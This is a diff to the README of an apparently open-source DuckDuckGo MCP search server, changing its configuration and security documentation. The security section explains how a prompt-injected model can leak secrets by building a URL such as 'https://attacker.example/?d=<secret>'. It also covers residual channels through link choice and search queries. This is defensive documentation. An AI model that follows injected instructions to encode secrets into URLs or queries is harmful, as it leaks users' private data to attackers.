@@ -292,7 +292,7 @@ uv run python -m pytest src/duckduckgo_mcp_server/test_e2e.py -v
 
 ## Configuration
 
-Every setting can be supplied as an environment variable (the usual way to configure an MCP server, via the `env` block in your client config) or as a CLI flag. **A CLI flag overrides the environment variable.**
+Every setting can be supplied as an environment variable - the usual way to configure an MCP server, via the `env` block in your client config. Most also have a CLI flag, and **a CLI flag overrides the environment variable**; where the table shows `-` in the flag column, the environment variable is the only way to set it.
 
 ### Search
 
@@ -345,6 +345,8 @@ These do nothing under the default `stdio` transport.
 **`DDG_FETCH_URL_POLICY=tokens` has a real usability cost.** Under `tokens`, `fetch_content` accepts only `ref://` tokens that this server issued from its own search results. That means the model **cannot follow a link it found inside a fetched page**, and **cannot fetch a URL you pasted into the chat**. Only results from its own searches are reachable.
 
 That restriction is the point. The way an injected instruction gets data out of a model's context is by building a URL containing it (`https://attacker.example/?d=<secret>`). Tokens are issued *before* any secret is known, so the model holds opaque handles with no field to encode data into. A residual channel remains - an attacker can pre-place many links and signal roughly a byte per fetch by which one is chosen - so this narrows the channel by orders of magnitude rather than proving it closed. `DDG_MAX_URL_LENGTH` and `DDG_FETCH_HOST_RPM` constrain what is left.
+
+**What `tokens` does not cover.** It restricts `fetch_content` URLs only. The `search` tool still takes a free-form query, so an injected instruction could ask the model to search for a secret and that text would reach DuckDuckGo. That is a far weaker channel than an attacker-chosen URL - the data goes to DuckDuckGo, who the attacker cannot query for it - but it is not closed, and this setting should not be read as "no data can leave".
 
 Use `tokens` when this server shares an agent with tools that hold secrets. Leave it at `any` for ordinary browsing where you want to paste URLs.
 
